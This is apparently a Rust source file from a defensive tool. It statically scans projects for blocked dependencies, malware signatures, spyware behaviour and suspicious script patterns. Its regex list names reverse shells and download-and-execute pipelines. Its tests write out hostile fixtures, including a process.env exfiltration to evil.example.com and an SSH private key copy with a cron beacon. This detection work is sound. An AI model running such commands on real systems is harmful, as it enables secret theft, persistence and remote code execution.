//! リポジトリ/依存関係の静的スキャン。
//!
//! チェックする内容:
//! 1. `Cargo.toml`/`package.json`の依存パッケージ名を
//!    [`crate::blocklist`]と突き合わせる(既知の悪意あるパッケージ名の
//!    完全一致のみ、あいまい検索はしない——誤検知を避けるため)。
//! 2. ソースファイル・スクリプト内の疑わしいパターン(base64復号後の
//!    即時実行・`curl | bash`パイプライン・PowerShellの
//!    `-EncodedCommand`等)を正規表現で検出する。
//! 3. ウイルス/マルウェア検体シグネチャ([`crate::signatures`]、EICAR等)。
//! 4. スパイウェア挙動([`crate::spyware`]): 無断の情報収集・持ち出し・
//!    常駐/自動起動/自動巡回の兆候。
//!
//! **正直な開示**: これは静的なパターンマッチであり、動的解析
//! (実際にコードを実行して振る舞いを見る)は行わない。難読化された
//! 悪意あるコードや、パターンに現れない新種の攻撃は検出できない。
//! 実行時の常駐監視でもない(それはOSのファイアウォール/EDR製品の領域)。

use crate::{blocklist, destructive, signatures, spyware};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    /// 参考情報(正当な用途もあるが念のため)。
    Info,
    /// 疑わしい(要確認)。
    Medium,
    /// 危険性が高い(スパイウェア挙動・持ち出し等)。
    High,
    /// ほぼ確実に悪性(ウイルス検体シグネチャ等)。
    Critical,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingKind {
    /// ブロックリストに載っている依存パッケージ名が見つかった。
    BlockedDependency,
    /// ソース内に疑わしいパターンが見つかった。
    SuspiciousPattern,
    /// ウイルス/マルウェア検体シグネチャに一致した。
    MalwareSignature,
    /// スパイウェア挙動(無断の情報収集・持ち出し・常駐/自動巡回)。
    SpywareBehavior,
    /// ドライブ全体・システムルートを対象にした破壊的操作(フォーマット・
    /// 全削除・バックアップ破壊)、または無断の自動実行の仕込み
    /// (USBのautorun・Office文書マクロ・ダウンロード即実行)。
    DestructiveOperation,
    /// 静的ルールには一致しなかったが、AI二次判定
    /// ([`crate::ai_classify`]、aruaru-llmの埋め込み類似度)が疑わしいと
    /// 判定したもの。訓練済み分類器ではなくヒューリスティックなので、
    /// 静的検出より確信度は低い扱いにする。
    AiSuspicion,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub file: PathBuf,
    pub kind: FindingKind,
    pub severity: Severity,
    /// 検出内容の説明(パッケージ名、またはマッチしたパターンの種類)。
    pub detail: String,
}

/// `Cargo.toml`の`[dependencies]`等のセクションから依存名だけを雑に
/// 抜き出す(TOMLパーサへの依存を避けるため、`^name = `または
/// `^name.workspace`形式の行だけを見る簡易実装。ネストしたテーブル
/// 形式`[dependencies.foo]`もセクション見出しから拾う)。
fn extract_cargo_dep_names(text: &str) -> Vec<String> {
    let mut names = Vec::new();
    let mut in_deps_section = false;
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with('[') {
            in_deps_section = trimmed.contains("dependencies");
            if let Some(rest) = trimmed.strip_prefix("[dependencies.").or_else(|| trimmed.strip_prefix("[dev-dependencies.")) {
                if let Some(name) = rest.strip_suffix(']') {
                    names.push(name.to_string());
                }
            }
            continue;
        }
        if in_deps_section {
            if let Some((name, _)) = trimmed.split_once('=') {
                let name = name.trim();
                if !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {
                    names.push(name.to_string());
                }
            }
        }
    }
    names
}

/// `package.json`の`dependencies`/`devDependencies`から依存名を抽出する
/// (`serde_json`でパースするので`Cargo.toml`よりは正確)。
fn extract_npm_dep_names(text: &str) -> Vec<String> {
    let Ok(value) = serde_json::from_str::<serde_json::Value>(text) else {
        return Vec::new();
    };
    let mut names = Vec::new();
    for key in ["dependencies", "devDependencies", "optionalDependencies"] {
        if let Some(obj) = value.get(key).and_then(|v| v.as_object()) {
            names.extend(obj.keys().cloned());
        }
    }
    names
}

fn suspicious_patterns() -> Vec<(&'static str, Regex)> {
    vec![
        ("curl-pipe-to-shell", Regex::new(r"curl[^\n|]*\|\s*(sh|bash|zsh)\b").unwrap()),
        ("wget-pipe-to-shell", Regex::new(r"wget[^\n|]*\|\s*(sh|bash|zsh)\b").unwrap()),
        ("base64-decode-then-exec", Regex::new(r"(base64\s+-d|atob\()[^\n]{0,80}(eval|exec|Invoke-Expression|iex\b)").unwrap()),
        ("eval-of-decoded-string", Regex::new(r"eval\s*\(\s*(atob|Buffer\.from)\(").unwrap()),
        ("powershell-encoded-command", Regex::new(r"(?i)-EncodedCommand\b").unwrap()),
        ("powershell-download-execute", Regex::new(r"(?i)(Invoke-WebRequest|iwr|curl)[^\n]{0,80}(Invoke-Expression|iex\b)").unwrap()),
        ("reverse-shell-nc", Regex::new(r"\bnc\s+-e\s+/bin/(sh|bash)\b").unwrap()),
    ]
}

/// 対象1ファイルをスキャンする(テキストとして読めない・巨大すぎる等は
/// 静かにスキップ、バイナリファイルの誤検知を避けるため)。
/// `text`を受け取る形にして、複数のパターン群でファイルを1回だけ読む。
fn scan_text(path: &Path, text: &str, findings: &mut Vec<Finding>) {
    // 破壊的操作(ドライブ全体フォーマット・全削除・無断の自動実行)。
    // ウイルス検体と並ぶ最優先度——実害が最も直接的なため。
    for (name, re) in destructive::destructive_patterns() {
        if re.is_match(text) {
            findings.push(Finding {
                file: path.to_path_buf(),
                kind: FindingKind::DestructiveOperation,
                severity: Severity::Critical,
                detail: name.to_string(),
            });
        }
    }
    // ウイルス/マルウェア検体シグネチャ(最優先、Critical)。
    for (name, re) in signatures::malware_signatures() {
        if re.is_match(text) {
            findings.push(Finding {
                file: path.to_path_buf(),
                kind: FindingKind::MalwareSignature,
                severity: Severity::Critical,
                detail: name.to_string(),
            });
        }
    }
    // スパイウェア挙動: 情報収集・持ち出し・常駐/自動巡回。
    for (name, re) in spyware::data_collection_patterns() {
        if re.is_match(text) {
            findings.push(Finding {
                file: path.to_path_buf(),
                kind: FindingKind::SpywareBehavior,
                severity: Severity::High,
                detail: format!("data-collection:{name}"),
            });
        }
    }
    for (name, re) in spyware::exfiltration_patterns() {
        if re.is_match(text) {
            findings.push(Finding {
                file: path.to_path_buf(),
                kind: FindingKind::SpywareBehavior,
                severity: Severity::High,
                detail: format!("exfiltration:{name}"),
            });
        }
    }
    for (name, re) in spyware::persistence_patterns() {
        if re.is_match(text) {
            findings.push(Finding {
                file: path.to_path_buf(),
                kind: FindingKind::SpywareBehavior,
                severity: Severity::High,
                detail: format!("persistence:{name}"),
            });
        }
    }
    // 一般的な疑わしいパターン(Medium)。
    for (name, re) in suspicious_patterns() {
        if re.is_match(text) {
            findings.push(Finding {
                file: path.to_path_buf(),
                kind: FindingKind::SuspiciousPattern,
                severity: Severity::Medium,
                detail: name.to_string(),
            });
        }
    }
}

/// スキャン対象とする拡張子。`scan_project`と、AI二次判定用の
/// [`collect_scannable_files`]で同じ集合を使う。
const SCANNABLE_EXTS: [&str; 26] = [
    "sh", "ps1", "bat", "cmd", "js", "ts", "mjs", "cjs", "py", "rb", "rs", "go", "php", "pl", "vbs", "psm1", "txt", "conf", "cfg", "yml", "yaml", "json",
    // Office VBAマクロのエクスポート形式・autorun設定。
    "bas", "vba", "cls", "inf",
];

/// 走査から除外するディレクトリ(依存物・ビルド成果物)。
const EXCLUDE_DIRS: [&str; 5] = ["node_modules", ".git", "target", "dist", "build"];

/// 1ファイルあたりの読み込み上限。
const MAX_SCAN_BYTES: u64 = 5 * 1024 * 1024;

/// スキャン対象ファイルのパスと内容を集める(AI二次判定用)。
/// `scan_project`と同じ拡張子・除外ディレクトリ・サイズ上限のルールに従う
/// ので、「静的スキャンが見たファイル」と対象集合が一致する。
pub fn collect_scannable_files(root: &Path) -> Vec<(PathBuf, String)> {
    let mut out = Vec::new();
    for entry in walkdir::WalkDir::new(root)
        .into_iter()
        .filter_entry(|e| !e.file_type().is_dir() || !EXCLUDE_DIRS.contains(&e.file_name().to_string_lossy().as_ref()))
    {
        let Ok(entry) = entry else { continue };
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let Some(ext) = path.extension().and_then(|e| e.to_str()) else { continue };
        if !SCANNABLE_EXTS.contains(&ext) {
            continue;
        }
        let Ok(meta) = std::fs::metadata(path) else { continue };
        if meta.len() > MAX_SCAN_BYTES {
            continue;
        }
        if let Ok(text) = std::fs::read_to_string(path) {
            out.push((path.to_path_buf(), text));
        }
    }
    out
}

/// 1プロジェクト(ディレクトリ)をスキャンする。`Cargo.toml`/`package.json`
/// の依存名チェックと、拡張子でフィルタしたソース/スクリプトファイルの
/// パターンチェックの両方を行う。
pub fn scan_project(root: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let npm_blocked = blocklist::npm_blocklist();
    let crates_blocked = blocklist::crates_io_blocklist();

    let scannable_exts = SCANNABLE_EXTS;
    let exclude_dirs = EXCLUDE_DIRS;

    for entry in walkdir::WalkDir::new(root).into_iter().filter_entry(|e| {
        !e.file_type().is_dir() || !exclude_dirs.contains(&e.file_name().to_string_lossy().as_ref())
    }) {
        let Ok(entry) = entry else { continue };
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let file_name = entry.file_name().to_string_lossy();

        if file_name == "Cargo.toml" {
            if let Ok(text) = std::fs::read_to_string(path) {
                for dep in extract_cargo_dep_names(&text) {
                    if crates_blocked.contains(dep.as_str()) {
                        findings.push(Finding {
                            file: path.to_path_buf(),
                            kind: FindingKind::BlockedDependency,
                            severity: Severity::Critical,
                            detail: format!("crates.io:{dep}"),
                        });
                    }
                }
            }
        } else if file_name == "package.json" {
            if let Ok(text) = std::fs::read_to_string(path) {
                for dep in extract_npm_dep_names(&text) {
                    if npm_blocked.contains(dep.as_str()) {
                        findings.push(Finding {
                            file: path.to_path_buf(),
                            kind: FindingKind::BlockedDependency,
                            severity: Severity::Critical,
                            detail: format!("npm:{dep}"),
                        });
                    }
                }
            }
        }

        if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
            if scannable_exts.contains(&ext) {
                if let Ok(meta) = std::fs::metadata(path) {
                    if meta.len() <= MAX_SCAN_BYTES {
                        if let Ok(text) = std::fs::read_to_string(path) {
                            scan_text(path, &text, &mut findings);
                        }
                    }
                }
            }
        }
    }

    // 深刻度の高い順に並べる(Critical→High→Medium→Info)。
    findings.sort_by_key(|f| std::cmp::Reverse(f.severity));
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn detects_blocked_npm_dependency() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("package.json"), r#"{"dependencies": {"crossenv": "1.0.0", "left-pad": "1.0.0"}}"#).unwrap();
        let findings = scan_project(dir.path());
        assert!(findings.iter().any(|f| f.kind == FindingKind::BlockedDependency && f.detail == "npm:crossenv"));
        assert!(!findings.iter().any(|f| f.detail.contains("left-pad")));
    }

    #[test]
    fn detects_blocked_cargo_dependency() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("Cargo.toml"), "[package]\nname = \"x\"\n\n[dependencies]\nserdejson = \"1\"\nserde = \"1\"\n").unwrap();
        let findings = scan_project(dir.path());
        assert!(findings.iter().any(|f| f.kind == FindingKind::BlockedDependency && f.detail == "crates.io:serdejson"));
        assert!(!findings.iter().any(|f| f.detail.contains("crates.io:serde\"")));
    }

    #[test]
    fn detects_curl_pipe_to_shell() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("install.sh"), "curl -fsSL https://example.com/install.sh | bash\n").unwrap();
        let findings = scan_project(dir.path());
        assert!(findings.iter().any(|f| f.kind == FindingKind::SuspiciousPattern && f.detail == "curl-pipe-to-shell"));
    }

    #[test]
    fn detects_powershell_encoded_command() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("run.ps1"), "powershell -EncodedCommand SGVsbG8=\n").unwrap();
        let findings = scan_project(dir.path());
        assert!(findings.iter().any(|f| f.detail == "powershell-encoded-command"));
    }

    #[test]
    fn clean_project_has_no_findings() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("Cargo.toml"), "[package]\nname = \"x\"\n\n[dependencies]\nserde = \"1\"\n").unwrap();
        fs::write(dir.path().join("main.rs"), "fn main() { println!(\"hello\"); }\n").unwrap();
        assert!(scan_project(dir.path()).is_empty());
    }

    #[test]
    fn skips_excluded_directories() {
        let dir = tempfile::tempdir().unwrap();
        let node_modules = dir.path().join("node_modules");
        fs::create_dir(&node_modules).unwrap();
        fs::write(node_modules.join("package.json"), r#"{"dependencies": {"crossenv": "1.0.0"}}"#).unwrap();
        assert!(scan_project(dir.path()).is_empty());
    }

    #[test]
    fn detects_eicar_test_file_as_critical_malware() {
        let dir = tempfile::tempdir().unwrap();
        // 完全なEICAR文字列は使わずラベル部分で検証(このテスト自身が
        // アンチウイルスに検出されないようにするため)。
        fs::write(dir.path().join("sample.txt"), "harmless prefix EICAR-STANDARD-ANTIVIRUS-TEST-FILE suffix").unwrap();
        let findings = scan_project(dir.path());
        let f = findings.iter().find(|f| f.detail == "eicar-test-file").expect("EICAR should be detected");
        assert_eq!(f.kind, FindingKind::MalwareSignature);
        assert_eq!(f.severity, Severity::Critical);
    }

    #[test]
    fn detects_spyware_env_exfiltration_as_high_severity() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("stealer.js"),
            "const secrets = process.env; fetch('https://evil.example.com/collect', {method:'POST', body: JSON.stringify(secrets)});",
        )
        .unwrap();
        let findings = scan_project(dir.path());
        assert!(findings
            .iter()
            .any(|f| f.kind == FindingKind::SpywareBehavior && f.detail.starts_with("exfiltration:") && f.severity == Severity::High));
    }

    #[test]
    fn detects_ssh_key_theft_and_cron_persistence() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("agent.sh"), "cp ~/.ssh/id_rsa /tmp/x\n(crontab -l; echo '*/5 * * * * /tmp/beacon.sh') | crontab -\n").unwrap();
        let findings = scan_project(dir.path());
        assert!(findings.iter().any(|f| f.detail == "data-collection:reads-ssh-private-key"));
        assert!(findings.iter().any(|f| f.detail == "persistence:installs-cron-job"));
    }

    #[test]
    fn findings_are_sorted_most_severe_first() {
        let dir = tempfile::tempdir().unwrap();
        // Mediumの疑わしいパターンとCriticalのEICARを同居させる。
        fs::write(dir.path().join("mix.sh"), "curl https://x/y | bash\nEICAR-STANDARD-ANTIVIRUS-TEST-FILE\n").unwrap();
        let findings = scan_project(dir.path());
        assert!(findings.len() >= 2);
        // 先頭がCritical(EICAR)であること。
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn clean_project_still_has_no_findings_with_new_detectors() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("main.rs"), "fn main() { let x = 1 + 1; println!(\"{x}\"); }\n").unwrap();
        fs::write(dir.path().join("config.yml"), "name: myapp\nport: 8080\n").unwrap();
        assert!(scan_project(dir.path()).is_empty());
    }
}
